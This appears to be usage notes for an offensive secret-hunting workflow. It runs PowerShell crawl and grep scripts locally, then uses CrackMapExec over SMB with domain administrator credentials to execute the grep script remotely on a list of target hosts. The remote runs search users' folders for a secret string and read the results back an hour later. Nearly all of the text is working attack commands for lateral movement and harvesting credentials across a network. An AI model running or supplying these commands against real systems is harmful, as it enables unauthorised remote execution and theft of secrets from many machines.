cd c:\path\to\crawl\windows
.\crawl.ps1 ..\path\to > out.log
.\grep.ps1 ..\path\to s3cr3t

cme smb -d dom -u adm -p pas -X '.\grep.ps1 c:\users s3cr3t > c:\grep.log' targets.txt
sleep 3600
cme smb -d dom -u adm -p pas -x 'type c:\grep.log' targets.txt
